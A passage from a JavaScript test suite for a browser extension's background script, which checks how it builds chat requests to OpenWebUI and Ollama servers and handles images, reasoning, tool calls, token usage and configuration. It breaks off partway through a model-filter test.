const { test } = require("node:test");
const assert = require("node:assert");
const { jsonResponse, htmlResponse, streamResponse, loadBackground } = require("./helpers");

const IMG = "data:image/png;base64,AAA";

function baseConfig(overrides = {}) {
    return {
        chatUrl: "http://host/api/chat/completions",
        apiKey: "sk-test",
        model: "default-model",
        apiFormat: "openai",
        ocrModel: "",
        ...overrides
    };
}

test("FETCH_LLM builds an OpenAI body and extracts the reply", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            assert.equal(call.url, "http://host/api/chat/completions");
            assert.equal(call.opts.method, "POST");
            assert.equal(call.opts.headers["Authorization"], "Bearer sk-test");
            assert.equal(call.body.model, "default-model");
            assert.equal(call.body.stream, false);
            assert.equal(call.body.params.think, false, "openai: think goes in params, not top-level");
            assert.equal(call.body.think, undefined, "not top-level (OpenWebUI drops it there)");
            assert.deepEqual(call.body.messages, [{ role: "user", content: "hi" }]);
            return jsonResponse({ choices: [{ message: { content: "yo" } }] });
        }
    });

    const res = await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "hi" }], think: false }
    });
    assert.deepEqual(res, { data: "yo", model: "default-model" });
});

test("FETCH_LLM think:false goes in params (openai) / top-level (ollama)", async () => {
    let sawO;
    const bgO = loadBackground({ config: baseConfig(), onFetch: (c) => { sawO = c.body; return jsonResponse({ choices: [{ message: { content: "ok" } }] }); } });
    await bgO.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }], think: false } });
    assert.equal(sawO.params.think, false, "openai: in params (OpenWebUI's channel)");
    assert.equal(sawO.think, undefined, "openai: not top-level");

    let sawL;
    const bgL = loadBackground({ config: baseConfig({ apiFormat: "ollama", chatUrl: "http://host/ollama/api/chat" }), onFetch: (c) => { sawL = c.body; return jsonResponse({ message: { content: "ok" } }); } });
    await bgL.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }], think: false } });
    assert.equal(sawL.think, false, "ollama: native top-level");
});

test("FETCH_LLM surfaces reasoning — reasoning_content (openai) and message.thinking (ollama)", async () => {
    const bgO = loadBackground({
        config: baseConfig(),
        onFetch: () => jsonResponse({ choices: [{ message: { content: "42", reasoning_content: "6 times 7" } }] })
    });
    const rO = await bgO.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "6*7?" }] } });
    assert.equal(rO.data, "42");
    assert.equal(rO.reasoning, "6 times 7");

    const bgL = loadBackground({
        config: baseConfig({ apiFormat: "ollama", chatUrl: "http://host/ollama/api/chat" }),
        onFetch: () => jsonResponse({ message: { content: "42", thinking: "6 times 7" } })
    });
    const rL = await bgL.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "6*7?" }] } });
    assert.equal(rL.reasoning, "6 times 7");
});

test("FETCH_LLM: choices present but null content → an empty reply, NOT a format error", async () => {
    // A MiniMax content-filtered reply: valid openai `choices`, but the message content
    // was blanked (output_sensitive). Must degrade to "" so a vision sub-call reads NONE
    // and the run continues — not crash with a misleading "check the API format" error.
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => jsonResponse({ id: "x", object: "chat.completion", choices: [{ message: { role: "assistant", content: null } }], output_sensitive: true, base_resp: { status_code: 0 } })
    });
    const res = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }] } });
    assert.equal(res.data, "", "empty/filtered message → empty reply");
    assert.ok(!res.error, "not surfaced as an error");
});

test("FETCH_LLM: a response with NO choices container IS a clear format-mismatch error", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => jsonResponse({ detail: "not found", nonsense: true })   // no `choices` → genuine mismatch
    });
    const res = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }] } });
    assert.match(res.error, /did not match the "openai" format/);
});

test("FETCH_LLM: an unreachable server → an actionable error, not a bare 'Failed to fetch'", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => { throw new TypeError("Failed to fetch"); }   // server down / refused / DNS
    });
    const res = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }] } });
    assert.match(res.error, /Couldn't reach the server/, "names the reach failure");
    assert.match(res.error, /http:\/\/host\/api\/chat\/completions/, "includes the URL that failed");
    assert.match(res.error, /settings/i, "points the user at settings");
});

test("FETCH_LLM: an empty Server URL is caught before any fetch, with an actionable message", async () => {
    let fetched = false;
    const bg = loadBackground({
        config: baseConfig({ chatUrl: "" }),
        onFetch: () => { fetched = true; return jsonResponse({ choices: [{ message: { content: "hi" } }] }); }
    });
    const res = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }] } });
    assert.match(res.error, /No server URL configured/);
    assert.equal(fetched, false, "no fetch is attempted with no URL");
});

test("FETCH_LLM omits the reasoning key when the model produced none", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => jsonResponse({ choices: [{ message: { content: "hi" } }] })
    });
    const res = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "q" }] } });
    assert.ok(!("reasoning" in res), "no reasoning key on a plain reply");
});

test("FETCH_LLM surfaces token usage — OpenWebUI `usage` block and Ollama-native root counts", async () => {
    // OpenWebUI nests a usage block (OpenAI naming).
    const bgO = loadBackground({
        config: baseConfig(),
        onFetch: () => jsonResponse({ choices: [{ message: { content: "42" } }], usage: { prompt_tokens: 18, completion_tokens: 70, total_tokens: 88 } })
    });
    const rO = await bgO.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "q" }] } });
    assert.deepEqual(rO.usage, { promptTokens: 18, completionTokens: 70, totalTokens: 88 });

    // Ollama-native puts prompt_eval_count/eval_count at the response root (no total).
    const bgL = loadBackground({
        config: baseConfig({ apiFormat: "ollama", chatUrl: "http://host/ollama/api/chat" }),
        onFetch: () => jsonResponse({ message: { content: "42" }, prompt_eval_count: 20, eval_count: 5 })
    });
    const rL = await bgL.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "q" }] } });
    assert.deepEqual(rL.usage, { promptTokens: 20, completionTokens: 5, totalTokens: 25 }, "total derived when absent");
});

test("FETCH_LLM raw returns reasoning_content (the agent path) — a tool-call turn with empty content", async () => {
    // The observed case: content:"" + reasoning_content has the thinking + a tool_call. The raw path
    // (agent loop) must surface `reasoning` alongside tool_calls, not drop it like it used to.
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => jsonResponse({ choices: [{ message: { content: "", reasoning_content: "The user wants the red guy.", tool_calls: [{ id: "c1", type: "function", function: { name: "exec", arguments: "{}" } }] } }] }),
    });
    const res = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "q" }], raw: true } });
    assert.equal(res.data.reasoning, "The user wants the red guy.", "reasoning_content surfaces on the raw path");
    assert.equal(res.data.content, "", "content is the (empty) prose");
    assert.equal(res.data.tool_calls.length, 1, "the tool call still comes through");
});

test("FETCH_LLM usage is null when the server reports no counts (never a fake 0)", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => jsonResponse({ choices: [{ message: { content: "hi" } }] })
    });
    const res = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "q" }] } });
    assert.equal(res.usage, null);
});

test("num_ctx: a smaller cap becomes the RESIDENT value when the model is already loaded bigger (no reload, no balloon)", async () => {
    let chatBody = null;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            // /api/ps says gemma4:31b is loaded with a 262144 window.
            if (call.url.includes("/api/ps")) return jsonResponse({ models: [{ model: "gemma4:31b", context_length: 262144, size_vram: 1 }] });
            chatBody = call.body;
            return jsonResponse({ choices: [{ message: { content: "ok" } }] });
        },
    });
    // A delegated vision call caps num_ctx at 8192 — but the resident 262144 fits, so we
    // send the RESIDENT value (matches the running instance → no reload). NOT omitted:
    // an omitted num_ctx would make a stale-residency reload auto-size to the default.
    await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }], model: "gemma4:31b", numCtx: 8192 } });
    assert.equal(chatBody.params.num_ctx, 262144, "sends the resident window, so it matches the running model (no reload) yet still bounds a mistaken fresh load");
});

test("num_ctx: the cap IS applied when the model is not resident (a fresh load stays bounded)", async () => {
    let chatBody = null;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            if (call.url.includes("/api/ps")) return jsonResponse({ models: [] });   // nothing loaded
            chatBody = call.body;
            return jsonResponse({ choices: [{ message: { content: "ok" } }] });
        },
    });
    await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }], model: "qwen2.5vl:7b", numCtx: 8192 } });
    assert.equal(chatBody.params.num_ctx, 8192, "cap applied — a fresh load must stay bounded");
});

test("num_ctx: the cap is kept when the resident window is SMALLER than requested (needs the space)", async () => {
    let chatBody = null;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            if (call.url.includes("/api/ps")) return jsonResponse({ models: [{ model: "m", context_length: 2048, size_vram: 1 }] });
            chatBody = call.body;
            return jsonResponse({ choices: [{ message: { content: "ok" } }] });
        },
    });
    await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }], model: "m", numCtx: 8192 } });
    assert.equal(chatBody.params.num_ctx, 8192, "resident 2048 < 8192 → keep the override");
});

test("FETCH_LLM omits think unless it is a boolean", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            assert.ok(!("think" in call.body));
            return jsonResponse({ choices: [{ message: { content: "ok" } }] });
        }
    });

    const res = await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "hi" }], think: null }
    });
    assert.equal(res.data, "ok");
});

test("FETCH_LLM maxTokens becomes max_tokens (openai) and is omitted otherwise", async () => {
    let sawBody;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => { sawBody = call.body; return jsonResponse({ choices: [{ message: { content: "ok" } }] }); }
    });

    await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }], maxTokens: 512 } });
    assert.equal(sawBody.max_tokens, 512);

    await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }] } });
    assert.ok(!("max_tokens" in sawBody), "no cap → no max_tokens field");

    // Non-positive / non-integer caps are ignored (no runaway guard, but no bad body).
    await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }], maxTokens: 0 } });
    assert.ok(!("max_tokens" in sawBody));
});

test("FETCH_LLM maxTokens becomes options.num_predict on the ollama format", async () => {
    let sawBody;
    const bg = loadBackground({
        config: baseConfig({ apiFormat: "ollama", chatUrl: "http://host/ollama/api/chat" }),
        onFetch: (call) => { sawBody = call.body; return jsonResponse({ message: { content: "ok" } }); }
    });

    await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }], maxTokens: 256 } });
    assert.equal(sawBody.options.num_predict, 256);
});

test("FETCH_LLM extend:'utility' resolves the utility model + num_ctx/num_gpu (ollama)", async () => {
    let sawBody;
    const bg = loadBackground({
        config: baseConfig({ apiFormat: "ollama", chatUrl: "http://host/ollama/api/chat", model: "big:70b", utilityModel: "small:0.8b", utilityNumCtx: 2048, utilityForceCpu: true }),
        onFetch: (call) => { sawBody = call.body; return jsonResponse({ message: { content: "ok" } }); }
    });
    const res = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }], extend: "utility" } });
    assert.equal(sawBody.model, "small:0.8b", "utility model");
    assert.equal(sawBody.options.num_ctx, 2048);
    assert.equal(sawBody.options.num_gpu, 0, "force CPU → num_gpu 0");
    assert.equal(res.model, "small:0.8b", "response reports the resolved (utility) model for the sidebar");
});

test("FETCH_LLM extend:'utility' falls back to the default model when unset", async () => {
    let sawBody;
    const bg = loadBackground({
        config: baseConfig({ apiFormat: "ollama", chatUrl: "http://host/ollama/api/chat", model: "big:70b", utilityModel: "" }),
        onFetch: (call) => { sawBody = call.body; return jsonResponse({ message: { content: "ok" } }); }
    });
    await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }], extend: "utility" } });
    assert.equal(sawBody.model, "big:70b");
});

test("FETCH_LLM explicit model + numCtx override the extend profile ({...profile, ...explicit})", async () => {
    let sawBody;
    const bg = loadBackground({
        config: baseConfig({ apiFormat: "ollama", chatUrl: "http://host/ollama/api/chat", utilityModel: "small:0.8b", utilityNumCtx: 2048 }),
        onFetch: (call) => { sawBody = call.body; return jsonResponse({ message: { content: "ok" } }); }
    });
    await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }], extend: "utility", model: "mid:14b", numCtx: 8192 } });
    assert.equal(sawBody.model, "mid:14b", "explicit model wins");
    assert.equal(sawBody.options.num_ctx, 8192, "explicit numCtx wins");
});

test("FETCH_LLM sends num_ctx/num_gpu in the params object on the openai format (OpenWebUI's channel)", async () => {
    let sawBody;
    const bg = loadBackground({
        config: baseConfig({ apiFormat: "openai", utilityModel: "small", utilityNumCtx: 2048, utilityForceCpu: true }),
        onFetch: (call) => { sawBody = call.body; return jsonResponse({ choices: [{ message: { content: "ok" } }] }); }
    });
    await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }], extend: "utility" } });
    assert.equal(sawBody.model, "small", "utility model applies");
    assert.equal(sawBody.params.num_ctx, 2048, "in params (OpenWebUI maps params → ollama options)");
    assert.equal(sawBody.params.num_gpu, 0);
    assert.equal(sawBody.options, undefined, "not a direct options object (OpenWebUI overwrites it)");
});

test("GET_CONFIG exposes the utility-model fields", async () => {
    const bg = loadBackground({
        config: baseConfig({ utilityModel: "small:0.8b", utilityNumCtx: 2048, utilityForceCpu: true }),
        onFetch: () => jsonResponse({})
    });
    const resp = await bg.send({ type: "GET_CONFIG", payload: {} });
    assert.equal(resp.data.utilityModel, "small:0.8b");
    assert.equal(resp.data.utilityNumCtx, 2048);
    assert.equal(resp.data.utilityForceCpu, true);
});

// ---- GET_INVOCATION (how the user opens the HUD) ----
// The shortcut is user-rebindable, so the answer must come from chrome.commands at call
// time. Hardcoding "Alt+Space" anywhere would eventually tell a user to press a dead key.

test("GET_INVOCATION reports the LIVE shortcut and flags it as the default", async () => {
    const bg = loadBackground({ config: baseConfig(), commandShortcut: "Alt+Space" });
    const resp = await bg.send({ type: "GET_INVOCATION", payload: {} });
    assert.equal(resp.data.shortcut, "Alt+Space");
    assert.equal(resp.data.defaultShortcut, "Alt+Space");
    assert.equal(resp.data.isDefault, true);
    assert.equal(resp.data.contextMenu, false);      // not shipped → never claimed
});

test("GET_INVOCATION flags a user-CUSTOMISED shortcut", async () => {
    const bg = loadBackground({ config: baseConfig(), commandShortcut: "Ctrl+Shift+K" });
    const resp = await bg.send({ type: "GET_INVOCATION", payload: {} });
    assert.equal(resp.data.shortcut, "Ctrl+Shift+K");
    assert.equal(resp.data.isDefault, false, "a rebound key must not be reported as the default");
    assert.equal(resp.data.defaultShortcut, "Alt+Space", "the original is still reported, for context");
});

test("GET_INVOCATION reports an UNBOUND shortcut rather than pretending the default works", async () => {
    // chrome.commands returns "" when the user cleared the binding or it collided with
    // another extension — the HUD then has no keyboard route at all.
    const bg = loadBackground({ config: baseConfig(), commandShortcut: "" });
    const resp = await bg.send({ type: "GET_INVOCATION", payload: {} });
    assert.equal(resp.data.shortcut, "");
    assert.equal(resp.data.isDefault, false);
});

test("GET_INVOCATION survives chrome.commands being unavailable", async () => {
    const bg = loadBackground({ config: baseConfig(), commandShortcut: null });
    const resp = await bg.send({ type: "GET_INVOCATION", payload: {} });
    assert.equal(resp.data.shortcut, "");
    assert.equal(resp.data.defaultShortcut, "Alt+Space", "the manifest default still answers");
});

test("GET_INVOCATION claims the context menu only once the permission is declared", async () => {
    // The right-click entry isn't built yet; this line turns itself on when it lands, so the
    // model never advertises an affordance the user doesn't have.
    const bg = loadBackground({ config: baseConfig(), manifestPermissions: ["storage", "contextMenus"] });
    const resp = await bg.send({ type: "GET_INVOCATION", payload: {} });
    assert.equal(resp.data.contextMenu, true);
});

test("FETCH_LLM honors a per-call model override", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            assert.equal(call.body.model, "override-model");
            return jsonResponse({ choices: [{ message: { content: "ok" } }] });
        }
    });

    const res = await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "hi" }], model: "override-model" }
    });
    assert.equal(res.data, "ok");
});

test("FETCH_LLM ocr flag resolves the dedicated ocrModel", async () => {
    const bg = loadBackground({
        config: baseConfig({ model: "qwen3:235b", ocrModel: "qwen2.5vl" }),
        onFetch: (call) => {
            if (call.url.endsWith("/api/show")) {
                return jsonResponse({ capabilities: ["completion", "vision"] });
            }
            assert.equal(call.body.model, "qwen2.5vl"); // not the reasoning model
            return jsonResponse({ choices: [{ message: { content: "hello world" } }] });
        }
    });

    const res = await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "transcribe", images: [IMG] }], ocr: true }
    });
    assert.equal(res.data, "hello world");
});

test("FETCH_LLM ocr flag errors clearly when no OCR model is set", async () => {
    const bg = loadBackground({
        config: baseConfig({ model: "", ocrModel: "" }),
        onFetch: () => assert.fail("no request should be sent")
    });

    const res = await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "x", images: [IMG] }], ocr: true }
    });
    assert.match(res.error, /No OCR model configured/);
});

test("FETCH_LLM errors clearly when no model is configured", async () => {
    const bg = loadBackground({
        config: baseConfig({ model: "" }),
        onFetch: () => assert.fail("no request should be sent")
    });

    const res = await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "hi" }] }
    });
    assert.match(res.error, /No model configured/);
    assert.equal(bg.calls.length, 0);
});

test("FETCH_LLM openai format attaches images as image_url content parts", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            if (call.url === "http://host/ollama/api/show") {
                return jsonResponse({ capabilities: ["completion", "vision"] });
            }
            assert.deepEqual(call.body.messages, [{
                role: "user",
                content: [
                    { type: "text", text: "look" },
                    { type: "image_url", image_url: { url: IMG } }
                ]
            }]);
            return jsonResponse({ choices: [{ message: { content: "seen" } }] });
        }
    });

    const res = await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "look", images: [IMG] }] }
    });
    assert.equal(res.data, "seen");
});

test("FETCH_LLM ollama format attaches bare-base64 images and reads message.content", async () => {
    const bg = loadBackground({
        config: baseConfig({ apiFormat: "ollama", chatUrl: "http://host/ollama/api/chat" }),
        onFetch: (call) => {
            if (call.url === "http://host/ollama/api/show") {
                return jsonResponse({ capabilities: ["completion", "vision"] });
            }
            assert.deepEqual(call.body.messages, [
                { role: "user", content: "look", images: ["AAA"] }
            ]);
            return jsonResponse({ message: { content: "seen" } });
        }
    });

    const res = await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "look", images: [IMG] }] }
    });
    assert.equal(res.data, "seen");
});

test("FETCH_LLM rejects images for a model without vision, before any chat request", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            assert.equal(call.url, "http://host/ollama/api/show");
            return jsonResponse({ capabilities: ["completion", "thinking"] });
        }
    });

    const res = await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "look", images: [IMG] }] }
    });
    assert.match(res.error, /does not support image input/);
    assert.equal(bg.calls.length, 1); // only the capability probe
});

test("FETCH_LLM annotates server errors when vision support is unknown", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            if (call.url.endsWith("/api/show")) return htmlResponse(405);
            return jsonResponse({ detail: "boom" }, 500);
        }
    });

    const res = await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "look", images: [IMG] }] }
    });
    assert.match(res.error, /HTTP 500/);
    assert.match(res.error, /may not support image input/);
});

test("MODEL_CAPS returns a model's capability list from /api/show", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            assert.ok(call.url.endsWith("/api/show"));
            assert.equal(call.body.model, "qwen3:32b");
            return jsonResponse({ capabilities: ["completion", "tools", "thinking"] });
        }
    });

    const res = await bg.send({ type: "MODEL_CAPS", payload: { model: "qwen3:32b" } });
    assert.deepEqual(res.data, ["completion", "tools", "thinking"]);
});

test("MODEL_CAPS returns null when capabilities can't be determined", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => htmlResponse(404)   // no /api/show on this backend
    });

    const res = await bg.send({ type: "MODEL_CAPS", payload: { model: "gpt-4o" } });
    assert.equal(res.data, null);
});

test("GET_CONFIG returns the model/ocrModel/apiFormat and withholds the URL and key", async () => {
    const bg = loadBackground({
        config: baseConfig({ model: "qwen3:235b", ocrModel: "qwen2.5vl", apiFormat: "ollama" })
    });

    const res = await bg.send({ type: "GET_CONFIG", payload: {} });
    assert.deepEqual(res.data, {
        model: "qwen3:235b", ocrModel: "qwen2.5vl", apiFormat: "ollama", defaultModelVision: "",
        utilityModel: "", utilityNumCtx: 4096, utilityForceCpu: false, autoApproveReadonly: false, autoApprovePython: false,
        groundingEnabled: false, groundingModel: "", groundingRange: 1000, debugMode: "off",
        // Computed per-origin: no sender.tab in this harness call → not on the whitelist → false. The raw
        // pageApprovalDomains list is deliberately NOT exposed (only this boolean for the caller's origin).
        pageApprovalAllowed: false,
    });
    // The page must never see the server URL, API key, or the raw approval-domain list (security invariants).
    assert.ok(!("chatUrl" in res.data) && !("apiKey" in res.data) && !("pageApprovalDomains" in res.data), Object.keys(res.data).join());
});

test("FETCH_LLM openai schema becomes a json_schema response_format", async () => {
    const schema = { type: "object", properties: { hide: { type: "boolean" } } };
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            assert.deepEqual(call.body.response_format, {
                type: "json_schema",
                json_schema: { name: "response", strict: true, schema }
            });
            assert.ok(!("format" in call.body));
            return jsonResponse({ choices: [{ message: { content: "{\"hide\":true}" } }] });
        }
    });

    const res = await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "hi" }], schema }
    });
    assert.equal(res.data, "{\"hide\":true}");
});

test("FETCH_LLM ollama schema becomes the native format field", async () => {
    const schema = { type: "object", properties: { hide: { type: "boolean" } } };
    const bg = loadBackground({
        config: baseConfig({ apiFormat: "ollama", chatUrl: "http://host/ollama/api/chat" }),
        onFetch: (call) => {
            assert.deepEqual(call.body.format, schema);
            assert.ok(!("response_format" in call.body));
            return jsonResponse({ message: { content: "{\"hide\":true}" } });
        }
    });

    const res = await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "hi" }], schema }
    });
    assert.equal(res.data, "{\"hide\":true}");
});

test("FETCH_LLM omits format fields when no schema is given", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            assert.ok(!("response_format" in call.body));
            assert.ok(!("format" in call.body));
            return jsonResponse({ choices: [{ message: { content: "ok" } }] });
        }
    });

    await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "hi" }] }
    });
});

test("FETCH_LLM raw mode returns normalized tool_calls (openai, string args)", async () => {
    const tools = [{ type: "function", function: { name: "readDom", parameters: {} } }];
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            assert.deepEqual(call.body.tools, tools);
            return jsonResponse({ choices: [{ message: {
                content: null,
                tool_calls: [{ id: "call_abc", function: { name: "readDom", arguments: '{"selector":".menu"}' } }]
            } }] });
        }
    });

    const res = await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "go" }], tools, raw: true }
    });
    assert.deepEqual(res.data, {
        content: null,
        tool_calls: [{ id: "call_abc", name: "readDom", arguments: { selector: ".menu" } }],
        reasoning: null,   // no reasoning_content in this reply
        usage: null,   // this mock reports no counts
    });
});

test("FETCH_LLM raw mode normalizes Ollama tool_calls (object args)", async () => {
    const bg = loadBackground({
        config: baseConfig({ apiFormat: "ollama", chatUrl: "http://host/ollama/api/chat" }),
        onFetch: () => jsonResponse({ message: {
            content: "",
            tool_calls: [{ function: { name: "readDom", arguments: { selector: ".menu" } } }]
        } })
    });

    const res = await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "go" }], raw: true }
    });
    assert.equal(res.data.tool_calls[0].name, "readDom");
    assert.deepEqual(res.data.tool_calls[0].arguments, { selector: ".menu" });
    assert.equal(res.data.tool_calls[0].id, "call_0");
});

test("FETCH_LLM passes toolIds to OpenWebUI as tool_ids (openai)", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            assert.deepEqual(call.body.tool_ids, ["web_search"]);
            // Forces a server-side execution mode so OpenWebUI runs the tool and
            // returns finished content. The exact label is version-dependent
            // ("legacy" on v0.10.0+, "default" on older); the invariant is that
            // it is NOT "native", which hands back an unexecuted tool_call.
            assert.ok(call.body.params.function_calling);
            assert.notEqual(call.body.params.function_calling, "native");
            return jsonResponse({ choices: [{ message: { content: "answer" } }] });
        }
    });

    const res = await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "weather?" }], toolIds: ["web_search"] }
    });
    assert.equal(res.data, "answer");
});

test("FETCH_LLM does not set function_calling when no toolIds", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            assert.equal(call.body.params, undefined);
            return jsonResponse({ choices: [{ message: { content: "hi" } }] });
        }
    });

    await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "hi" }] }
    });
});

// OpenWebUI hands back an unexecuted tool_call (empty content + tool_calls) when
// the function_calling mode wasn't the server-side loop. We retry with the next
// mode label rather than sniffing the version.
const handedBack = () => jsonResponse({
    choices: [{
        finish_reason: "tool_calls",
        message: {
            content: "",
            tool_calls: [{ id: "c1", type: "function", function: { name: "get_x", arguments: "{}" } }]
        }
    }]
});

test("FETCH_LLM retries a handed-back tool call with the fallback mode", async () => {
    const modes = [];
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            modes.push(call.body.params.function_calling);
            // First mode: server hands the call back unexecuted; second: it runs.
            return modes.length === 1
                ? handedBack()
                : jsonResponse({ choices: [{ message: { content: "done" } }] });
        }
    });

    const res = await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "go" }], toolIds: ["t"] }
    });
    assert.equal(res.data, "done");
    assert.deepEqual(modes, ["legacy", "default"]);
    assert.equal(bg.calls.length, 2);
});

test("FETCH_LLM throws a clear error when the tool call is never executed", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => handedBack()
    });

    const res = await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "go" }], toolIds: ["t"] }
    });
    assert.match(res.error, /without executing it/);
    assert.equal(bg.calls.length, 2);     // tried each mode, then gave up
});

test("FETCH_LLM rejects toolIds on the Ollama-native format", async () => {
    const bg = loadBackground({
        config: baseConfig({ apiFormat: "ollama", chatUrl: "http://host/ollama/api/chat" }),
        onFetch: () => assert.fail("no request should be sent")
    });

    const res = await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "x" }], toolIds: ["web_search"] }
    });
    assert.match(res.error, /requires OpenWebUI/);
    assert.equal(bg.calls.length, 0);
});

test("FETCH_LLM builds tool-call and tool-result messages (openai wire shape)", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            const [asst, toolMsg] = call.body.messages;
            assert.deepEqual(asst.tool_calls[0], {
                id: "call_0", type: "function",
                function: { name: "readDom", arguments: '{"selector":".x"}' }
            });
            assert.deepEqual(toolMsg, { role: "tool", tool_call_id: "call_0", content: "result text" });
            return jsonResponse({ choices: [{ message: { content: "done" } }] });
        }
    });

    await bg.send({ type: "FETCH_LLM", payload: { raw: true, messages: [
        { role: "assistant", content: null, tool_calls: [{ id: "call_0", name: "readDom", arguments: { selector: ".x" } }] },
        { role: "tool", tool_call_id: "call_0", content: "result text" }
    ] } });
});

test("FETCH_LLM omits tool_call_id in tool results for Ollama", async () => {
    const bg = loadBackground({
        config: baseConfig({ apiFormat: "ollama", chatUrl: "http://host/ollama/api/chat" }),
        onFetch: (call) => {
            const toolMsg = call.body.messages.find(m => m.role === "tool");
            assert.deepEqual(toolMsg, { role: "tool", content: "r" });
            assert.ok(!("tool_call_id" in toolMsg));
            return jsonResponse({ message: { content: "done" } });
        }
    });

    await bg.send({ type: "FETCH_LLM", payload: { raw: true, messages: [
        { role: "tool", tool_call_id: "call_0", content: "r" }
    ] } });
});

test("FETCH_LLM explains a response shape mismatch", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => jsonResponse({ detail: "weird" })
    });

    const res = await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "hi" }] }
    });
    assert.match(res.error, /"openai" format/);
    assert.match(res.error, /choices\[0\]\.message\.content/);
    assert.match(res.error, /detail/);
});

test("SET_MODEL validates against the server list and persists", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            assert.equal(call.url, "http://host/api/models");
            return jsonResponse({ data: [{ id: "a" }, { id: "b" }] });
        }
    });

    const ok = await bg.send({ type: "SET_MODEL", payload: { model: "b" } });
    assert.deepEqual(ok, { data: "b" });
    assert.equal(bg.stored.model, "b");

    const bad = await bg.send({ type: "SET_MODEL", payload: { model: "zzz" } });
    assert.match(bad.error, /Unknown model "zzz"/);
    assert.match(bad.error, /a, b/);
    assert.equal(bg.stored.model, "b"); // unchanged
});

test("model filter: FETCH_LLM blocks a model outside the whitelist, allows a matching one", async () => {
    const bg = loadBackground({
        config: baseConfig({ modelFilter: "^qwen" }),
        onFetch: () => jsonResponse({ choices: [{ message: { content: "ok" } }] }),
    });
